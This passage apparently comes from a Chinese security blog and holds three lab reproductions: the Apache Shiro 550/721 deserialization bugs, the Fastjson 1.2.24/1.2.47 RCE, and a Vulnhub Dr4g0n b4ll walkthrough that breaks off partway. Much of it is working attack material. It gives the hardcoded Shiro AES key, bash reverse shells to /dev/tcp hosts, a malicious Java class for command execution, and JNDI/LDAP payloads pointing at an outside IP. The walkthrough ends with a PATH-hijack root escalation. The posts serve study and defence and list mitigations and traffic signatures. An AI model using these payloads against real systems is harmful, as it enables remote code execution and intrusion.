        <content type="html"><![CDATA[<h1 id="【漏洞复现】Shiro-反序列化漏洞复现"><a href="#【漏洞复现】Shiro-反序列化漏洞复现" class="headerlink" title="【漏洞复现】Shiro 反序列化漏洞复现"></a>【漏洞复现】Shiro 反序列化漏洞复现</h1><h2 id="一、Shiro-介绍"><a href="#一、Shiro-介绍" class="headerlink" title="一、Shiro 介绍"></a>一、Shiro 介绍</h2><h3 id="1、Shiro-简介"><a href="#1、Shiro-简介" class="headerlink" title="1、Shiro 简介"></a>1、Shiro 简介</h3><p>Shiro 是Apache 的一个强大且易用的Java安全框架，用来进行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，就会导致shiro的反序列化漏洞。</p><h3 id="2、如何判断Shiro-框架（Shiro指纹）"><a href="#2、如何判断Shiro-框架（Shiro指纹）" class="headerlink" title="2、如何判断Shiro 框架（Shiro指纹）"></a>2、如何判断Shiro 框架（Shiro指纹）</h3><p>勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响应包中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p><h2 id="二、Shiro-550反序列化漏洞（CVE-2016-4437）"><a href="#二、Shiro-550反序列化漏洞（CVE-2016-4437）" class="headerlink" title="二、Shiro 550反序列化漏洞（CVE-2016-4437）"></a>二、Shiro 550反序列化漏洞（CVE-2016-4437）</h2><h3 id="1、漏洞成因"><a href="#1、漏洞成因" class="headerlink" title="1、漏洞成因"></a>1、漏洞成因</h3><p>影响版本：<strong>Apache Shiro &lt;&#x3D;1.2.24</strong></p><p>在受影响的 Apache Shiro 版本中使用了固定的AES密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code>。</p><p>cookie的流程是：得到 rememberMe 的cookie 值–&gt;进行Base64 解密–&gt;再进行AES解密–&gt;最后进行反序列化执行代码。</p><h3 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><p>使用vulhub 搭建靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Shiro/image-20240227134907495.png" alt="image-20240227134907495"></p><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>用BP抓包，确认是Shiro 框架</p><p><img src="/img/VulnRep-Shiro/image-20240227135459292.png" alt="image-20240227135459292"></p><p>我们使用现成的工具进行检测，指定固定的密钥</p><p><img src="/img/VulnRep-Shiro/image-20240227140040809.png" alt="image-20240227140040809"></p><p><img src="/img/VulnRep-Shiro/image-20240227140136993.png" alt="image-20240227140136993"></p><h3 id="4、内存马注入"><a href="#4、内存马注入" class="headerlink" title="4、内存马注入"></a>4、内存马注入</h3><p>先准备好Shiro 类型的内存马：是经过了序列化和AES加密以及Base64加密</p><p><img src="/img/VulnRep-Shiro/image-20240423171813971.png" alt="image-20240423171813971"></p><p>抓包注入</p><p><img src="/img/VulnRep-Shiro/image-20240423172324721.png" alt="image-20240423172324721"></p><p>蚁剑连接</p><p><img src="/img/VulnRep-Shiro/image-20240423174226067.png" alt="image-20240423174226067"></p><h2 id="三、Shiro-721反序列化漏洞（CVE-2019-12422）"><a href="#三、Shiro-721反序列化漏洞（CVE-2019-12422）" class="headerlink" title="三、Shiro 721反序列化漏洞（CVE-2019-12422）"></a>三、Shiro 721反序列化漏洞（CVE-2019-12422）</h2><h3 id="1、漏洞成因-1"><a href="#1、漏洞成因-1" class="headerlink" title="1、漏洞成因"></a>1、漏洞成因</h3><p>影响版本：<strong>1.2.4 &lt; Apache Shiro &lt; 1.4.2</strong></p><p>相较于shiro 550，在shiro 721中使用的加密方式是AES-CBC，其中的aes加密的key 变成由系统随机生成，但是其他解析过程依然一样，也就意味着，如果我们能够得到aes 解密使用的key 的话，依然能够进行反序列化RCE</p><h3 id="2、环境搭建-1"><a href="#2、环境搭建-1" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inspiringz/Shiro-721.git</span><br><span class="line">cd Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure><p>如果未能启动成功，可以再执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -p 8080:8080 -it shiro-721</span><br></pre></td></tr></table></figure><p>将会把容器的执行情况输出到前台，之后访问即可</p><p><img src="/img/VulnRep-Shiro/image-20240314141349035.png" alt="image-20240314141349035"></p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>访问靶机的8080端口，进入登录页面</p><p><img src="/img/VulnRep-Shiro/image-20240314160244583.png" alt="image-20240314160244583"></p><p>上方提示了用户名和密码，我们用其中一个进行登录，并勾选<code>Remember Me</code>，抓包</p><p><img src="/img/VulnRep-Shiro/image-20240314161130004.png" alt="image-20240314161130004"></p><p>确认是Shiro 框架，我们依然使用工具，我们不知道aes加密的密钥kay，需要在登录成功之后尝试爆破</p><p><img src="/img/VulnRep-Shiro/image-20240314161503333.png" alt="image-20240314161503333"></p><p>之后填入密钥，检测利用链，尝试命令执行，成功获取shell</p><p><img src="/img/VulnRep-Shiro/image-20240314161603880.png" alt="image-20240314161603880"></p><h2 id="四、上线不出网Shiro反序列化"><a href="#四、上线不出网Shiro反序列化" class="headerlink" title="四、上线不出网Shiro反序列化"></a>四、上线不出网Shiro反序列化</h2><p>Shiro反序列化检测脚本：<a href="https://github.com/zhzyker/shiro-1.2.4-rce">https://github.com/zhzyker/shiro-1.2.4-rce</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-1.2.4_rce.py http://1.1.1.1:8080</span><br></pre></td></tr></table></figure><p>之后执行反弹shell，用nc监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.109.9/8889 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><ul><li>及时升级shiro版本，不再使用固定的密钥加密。</li><li>在应用程序上部署防火墙、加强身份验证等措施以提高安全性</li><li>如果程序不需要RememberMe功能，则完全可以禁用它</li></ul><h2 id="六、shrio550和721的区别"><a href="#六、shrio550和721的区别" class="headerlink" title="六、shrio550和721的区别"></a>六、shrio550和721的区别</h2><ol><li>主要区别在于Shiro550的ase加密的key使用已知默认密码，只要有足够的密码，不需要Remember Cookie的</li><li>Shiro721的ase加密的key为系统随机生成，需要利用登录后的rememberMe去爆破正确的key值。利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，再去构造反序列化攻击。</li></ol><h2 id="七、Shiro-攻击流量特征"><a href="#七、Shiro-攻击流量特征" class="headerlink" title="七、Shiro 攻击流量特征"></a>七、Shiro 攻击流量特征</h2><p>总结：</p><ol><li>请求包Cookie的rememberMe中会存在AES+base64加密的一串java反序列化代码。</li><li>响应头存在<code>Set-Cookie：rememberMe=deleteMe</code></li><li>响应包中存在base64加密数据，该数据可作为攻击成功的判定条件。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Fastjson 系列反序列化漏洞复现</title>
      <link href="/2024/02/26/VulnRep-Fastjson/"/>
      <url>/2024/02/26/VulnRep-Fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Fastjson-系列反序列化漏洞复现"><a href="#【漏洞复现】Fastjson-系列反序列化漏洞复现" class="headerlink" title="【漏洞复现】Fastjson 系列反序列化漏洞复现"></a>【漏洞复现】Fastjson 系列反序列化漏洞复现</h1><h2 id="零、Fastjson-简介"><a href="#零、Fastjson-简介" class="headerlink" title="零、Fastjson 简介"></a>零、Fastjson 简介</h2><p>Fastjson 是由阿里巴巴开源的一个 Java 库，用于处理 JSON 数据格式的序列化和反序列化，但是在这个过程中并没有使用Java 自带的序列化机制，而是自定义了一套机制。同时它因为性能优异而在 Java 开发者中广受欢迎。然而，Fastjson 在处理反序列化操作时存在一些安全问题，这些问题可能导致远程代码执行（RCE）等严重的安全漏洞。</p><h2 id="一、Fastjson-框架和版本判断"><a href="#一、Fastjson-框架和版本判断" class="headerlink" title="一、Fastjson 框架和版本判断"></a>一、Fastjson 框架和版本判断</h2><h3 id="1、判断fastjson-框架"><a href="#1、判断fastjson-框架" class="headerlink" title="1、判断fastjson 框架"></a>1、判断fastjson 框架</h3><p>在fastjson 请求包中增加json 请求体，看是否处于报错页面</p><p><img src="/img/VulnRep-Fastjson/image-20240310141109197.png" alt="image-20240310141109197"></p><h3 id="2、判断版本"><a href="#2、判断版本" class="headerlink" title="2、判断版本"></a>2、判断版本</h3><p>1、方法一：返回页面判断</p><p>这里检测的是1.2.47版本，但是针对1.2.24版本的话是没有回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;b&#123;</span><br><span class="line">或</span><br><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</span><br></pre></td></tr></table></figure><p>这样单有报错，却没有回显版本信息属于1.2.47之前的版本</p><p><img src="/img/VulnRep-Fastjson/image-20240310140409923.png" alt="image-20240310140409923"></p><p>这样既有错误页面也返回了fastjson 的版本信息属于1.2.47之后</p><p><img src="/img/VulnRep-Fastjson/image-20240310140507668.png" alt="image-20240310140507668"></p><h2 id="二、Fastjson-1-2-24-RCE-反序列化漏洞复现"><a href="#二、Fastjson-1-2-24-RCE-反序列化漏洞复现" class="headerlink" title="二、Fastjson 1.2.24-RCE 反序列化漏洞复现"></a>二、Fastjson 1.2.24-RCE 反序列化漏洞复现</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><ol><li>AutoType 功能：Fastjson 引入了AutoType 功能（自动类型，支持自省），开启该功能后在JSON 序列化之后的数据中多了一个 @type 字段。该字段可以指定反序列化的目标类型，允许序列化和反序列化未知类型的 Java 对象。</li><li>安全风险：当 Fastjson 处理包含 @type 字段的 JSON 数据时，它会尝试根据指定的类型创建对象，并调用其中的方法，导致安全漏洞。</li><li>利用链：攻击者可以构造特定的 JSON 数据，通过 @type 字段指定一个存在安全漏洞的类。在反序列化过程中，Fastjson 会加载并执行这个类，从而执行攻击者指定的代码。</li><li>RMI 和 JNDI 利用：一些已知的 Fastjson 漏洞利用了 Java 的 RMI（远程方法调用）和 JNDI（Java 命名和目录接口）功能。攻击者可以通过这些接口远程执行代码，甚至在服务器上创建后门。</li></ol><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Fastjson &lt;&#x3D; 1.2.24</li><li>Fastjson &lt;&#x3D; 1.2.42</li><li>Fastjson &lt;&#x3D; 1.2.43</li><li>Fastjson &lt;&#x3D; 1.2.47</li><li>Fastjson &lt;&#x3D; 1.2.62</li></ul><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><h4 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h4><p>我们采用docker 进行部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/fastjson/1.2.24-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Fastjson/image-20240226144903359.png" alt="image-20240226144903359"></p><p>访问靶机的8091端口</p><p><img src="/img/VulnRep-Fastjson/image-20240226144959732.png" alt="image-20240226144959732"></p><p>通过BP抓包构造json数据</p><p><img src="/img/VulnRep-Fastjson/image-20240226145541569.png" alt="image-20240226145541569"></p><p>页面报错，并未显示版本信息，判断为1.2.47版本以下</p><h4 id="2、Dnslog平台命令回显"><a href="#2、Dnslog平台命令回显" class="headerlink" title="2、Dnslog平台命令回显"></a>2、Dnslog平台命令回显</h4><p>构造一个java类，执行ping 命令，采用dnslog 回显平台进行命令回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class dnslog&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping user.`whoami`.ccnfcs.dnslog.cn&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // 报错信息</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Fastjson/image-20240226150343584.png" alt="image-20240226150343584"></p><p>使用javac 进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac dnslog.java</span><br></pre></td></tr></table></figure><p>将编译好的.class 文件放在公网服务器上，并通过py3开启一个http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>安装marshalsec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br><span class="line">cd marshalsec/</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line">cd target/</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://(启动python服务的ip):(启动python服务的端口)/#&lt;类名如dnslog&gt; 9999</span><br></pre></td></tr></table></figure><p>启动服务，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.139:8000/#dnslog&quot; 9999</span><br></pre></td></tr></table></figure><p>漏洞利用，bp提交如下json格式（不同版本利用姿势的POC不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.139:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在dnslog 平台将会得到命令回显</p><h4 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ExpLinux &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        String[] cmd = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/&lt;vps_ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并拿到恶意类的<code>ExpLinux.class</code>文件，开启 http 服务，再利用marshalsec 开启JNDI 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line"> </span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://&lt;vps_ip&gt;:8000/#ExpLinux 9999</span><br></pre></td></tr></table></figure><p>提交如下格式，nc监听bash 即将反弹的port：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://43.143.15.244:9999/ExpLinux&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、Fastjson-1-2-47-RCE-漏洞复现"><a href="#三、Fastjson-1-2-47-RCE-漏洞复现" class="headerlink" title="三、Fastjson 1.2.47-RCE 漏洞复现"></a>三、Fastjson 1.2.47-RCE 漏洞复现</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><ol><li>AutoType 功能：Fastjson 提供了 autoType 功能，允许用户在反序列化数据中通过 “@type” 指定反序列化的类型。</li><li>自定义反序列化机制：Fastjson 自定义的反序列化机制会在反序列化过程中调用指定类中的 setter 方法及部分 getter 方法。</li><li>缓存机制滥用：在 Fastjson 1.2.47 及以下版本中，攻击者可以利用其缓存机制来绕过未开启 autoType 功能的保护。</li></ol><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Fastjson 1.2.47 以及之前的所有版本都受到了这个漏洞的影响。</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>环境搭建用BP抓包测试</p><p><img src="/img/VulnRep-Fastjson/image-20240226170304593.png" alt="image-20240226170304593"></p><p>返回数据中存在fastjson 版本信息</p><p>只需要更改最后的payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.139:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h2><ul><li>升级Fastjson到修复了该漏洞的版本。</li><li>关闭Fastjson的autoType 支持，或者在代码中对反序列化的数据进行严格的验证和过滤。</li><li>使用IP 的黑白名单控制访问</li><li>进行监控和日志记录</li></ul>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_Dr4g0n b4ll</title>
      <link href="/2024/02/24/Vulnhub-Dr4g0n-b4ll/"/>
      <url>/2024/02/24/Vulnhub-Dr4g0n-b4ll/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Dr4g0n-b4ll靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Dr4g0n-b4ll靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_Dr4g0n b4ll靶场渗透"></a>【Vulnhub系列靶场】Vulnhub_Dr4g0n b4ll靶场渗透</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>选择打开.ovf 文件</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224152423286.png" alt="image-20240224152423286"></p><p>配置名称和路径</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224152402352.png" alt="image-20240224152402352"></p><p>打开后调整网络连接模式为【NAT】即可</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135014762.png" alt="image-20240224135014762"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>1、快速粗略的端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.65</span><br></pre></td></tr></table></figure><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135148134.png" alt="image-20240224135148134" style="zoom:150%;" /><p>2、详细端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.65</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135658689.png" alt="image-20240224135658689"></p><p>3、详细扫描和漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -A -p22,80 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135440463.png" alt="image-20240224135440463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135500772.png" alt="image-20240224135500772"></p><p>只发现了一个robots.txt 的文件</p><h3 id="3、web-目录探测"><a href="#3、web-目录探测" class="headerlink" title="3、web 目录探测"></a>3、web 目录探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster.exe dir -u http://192.168.31.65 -w d:\theperson\dirs\dicc.txt -b 404,403 --no-error</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140201673.png" alt="image-20240224140201673"></p><h3 id="4、web-框架探测"><a href="#4、web-框架探测" class="headerlink" title="4、web 框架探测"></a>4、web 框架探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140522211.png" alt="image-20240224140522211"></p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、查看敏感信息"><a href="#1、查看敏感信息" class="headerlink" title="1、查看敏感信息"></a>1、查看敏感信息</h3><p>1、主页</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140723028.png" alt="image-20240224140723028"></p><p>2、robots.txt 文件</p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140817155.png" alt="image-20240224140817155" style="zoom:200%;" /><p>进行base64解码：</p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140957715.png" alt="image-20240224140957715" style="zoom:200%;" /><p>3、源代码</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224141117019.png" alt="image-20240224141117019"></p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224141448789.png" alt="image-20240224141448789" style="zoom:150%;" /><h3 id="2、DRAGON-BALL目录信息"><a href="#2、DRAGON-BALL目录信息" class="headerlink" title="2、DRAGON BALL目录信息"></a>2、DRAGON BALL目录信息</h3><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224142227549.png" alt="image-20240224142227549"></p><p>1、secret.txt 文件</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224142428287.png" alt="image-20240224142428287"></p><p>保存下来做目录爆破</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143723348.png" alt="image-20240224143723348"></p><p>并无收获</p><p>2、Vulnhub 目录</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143748924.png" alt="image-20240224143748924"></p><p>3、Vulnhub&#x2F;login.html：是一个虚假的登录页面</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143820482.png" alt="image-20240224143820482"></p><p>4、aj.jpg：一张黑客的图片</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224144139876.png" alt="image-20240224144139876"></p><h3 id="3、图片信息提取"><a href="#3、图片信息提取" class="headerlink" title="3、图片信息提取"></a>3、图片信息提取</h3><p>提取图片隐写信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek aj.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150532499.png" alt="image-20240224150532499" style="zoom:150%;" /><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150607293.png" alt="image-20240224150607293"></p><h3 id="4、获取shell-立足点"><a href="#4、获取shell-立足点" class="headerlink" title="4、获取shell 立足点"></a>4、获取shell 立足点</h3><p>此时拿到一个ssh密钥，欠缺用户名，此处的xmen 是用户名</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150858190.png" alt="image-20240224150858190"></p><p>我们直接用密钥进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xmen@192.168.31.65 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150946067.png" alt="image-20240224150946067"></p><p>成功拿到shell</p><h1 id="四、提权至root"><a href="#四、提权至root" class="headerlink" title="四、提权至root"></a>四、提权至root</h1><h3 id="1、查看敏感文件"><a href="#1、查看敏感文件" class="headerlink" title="1、查看敏感文件"></a>1、查看敏感文件</h3><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224151439588.png" alt="image-20240224151439588"></p><p>shell 是一个suid权限，发现可以执行环境变量中的ps 命令，那么可以尝试用环境变量劫持来提权</p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd ~/script</span><br><span class="line">./script</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224151818159.png" 